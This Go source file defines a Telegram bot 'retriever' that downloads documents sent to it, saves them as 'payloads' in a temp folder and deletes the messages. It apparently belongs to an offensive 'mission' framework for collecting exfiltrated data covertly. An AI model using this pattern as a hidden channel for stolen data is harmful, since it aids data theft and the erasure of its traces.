package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"protosyte.io/mission-config"
)

type Retriever struct {
	bot   *tgbotapi.BotAPI
	store string
}

func NewRetriever(token string) *Retriever {
	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		log.Fatal(err)
	}

	// Try to load mission config for store path
	missionConfig, _ := mission.LoadMissionConfig("")
	store := "/tmp/rig_store"
	if missionConfig != nil && missionConfig.Analysis.VMIP != "" {
		// Could use mission config for custom store path
	}
	os.MkdirAll(store, 0755)

	return &Retriever{
		bot:   bot,
		store: store,
	}
}

func (r *Retriever) Retrieve() error {
	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := r.bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message != nil {
			if update.Message.Document != nil {
				// Download document
				file, err := r.bot.GetFile(tgbotapi.FileConfig{
					FileID: update.Message.Document.FileID,
				})
				if err != nil {
					log.Printf("[RET] Failed to get file: %v", err)
					continue
				}

				// Save encrypted payload
				filePath := filepath.Join(r.store, file.FileID)
				if err := r.downloadFile(file.FilePath, filePath); err != nil {
					log.Printf("[RET] Failed to download: %v", err)
					continue
				}

				log.Printf("[RET] Saved payload: %s", filePath)

				// Confirm receipt and delete message
				r.bot.Send(tgbotapi.NewDeleteMessage(update.Message.Chat.ID, update.Message.MessageID))
			}
		}
	}

	return nil
}

func (r *Retriever) downloadFile(filePath, destPath string) error {
	// Download file from Telegram API
	url, err := r.bot.GetFileDirectURL(filePath)
	if err != nil {
		return fmt.Errorf("failed to get file URL: %w", err)
	}
	
	// Use HTTP client to download
	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to download file: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 200 {
		return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}
	
	// Create destination file
	out, err := os.Create(destPath)
	if err != nil {
		return fmt.Errorf("failed to create file: %w", err)
	}
	defer out.Close()
	
	// Copy file contents
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("failed to write file: %w", err)
	}
	
	return nil
}

